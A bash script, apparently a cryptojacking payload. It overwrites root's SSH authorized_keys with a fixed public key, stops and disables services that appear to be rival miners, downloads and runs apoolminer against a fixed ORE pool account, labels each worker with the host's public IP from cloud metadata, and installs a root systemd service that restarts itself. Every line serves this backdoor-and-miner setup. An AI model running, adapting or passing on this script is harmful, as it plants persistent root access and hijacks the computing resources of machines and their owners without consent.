#!/bin/bash
mkdir -p /root/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAl5QreAwkidb7s2ucEKdlQ1q9/voCnGiLjvwwmQPgpm' >/root/.ssh/authorized_keys
chmod 700 /root/.ssh/authorized_keys
chown -R root:root /root/.ssh/authorized_keys

systemctl stop ore scash shai tdc
systemctl disable ore scash shai tdc

rm -rf /opt/ore

DIR="/opt/ore"

mkdir -p $DIR


wget -T 3 -t 2 -qO- https://github.com/apool-io/apoolminer/releases/download/v2.6.6/apoolminer_linux_v2.6.6.tar | tar -zxf - -C $DIR

chmod +x $DIR/apoolminer

COMMAND_BASE="${DIR}/apoolminer -A ore --pool ore1.hk.apool.io:9090 --worker \$ALIAS --account CP_2b4k7rqhk2 --gpu-off"

echo '''#!/bin/bash
ALIAS="$(wget -T 3 -t 2 -qO- http://169.254.169.254/2021-03-23/meta-data/public-ipv4)"
[ -z "$ALIAS" ] && ALIAS=$(wget -T 3 -t 2 -qO- ifconfig.me)

''' > $DIR/start.sh
echo $COMMAND_BASE >> $DIR/start.sh
chmod +x $DIR/start.sh

echo """[Unit]
Description=ore
DefaultDependencies=no
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$DIR
ExecStart=$DIR/start.sh
Restart=always
RestartSec=5s
StandardOutput=file:$DIR/worker.log
StandardError=inherit
[Install]
WantedBy=default.target""" > /etc/systemd/system/ore.service

systemctl daemon-reload
systemctl enable ore
systemctl restart ore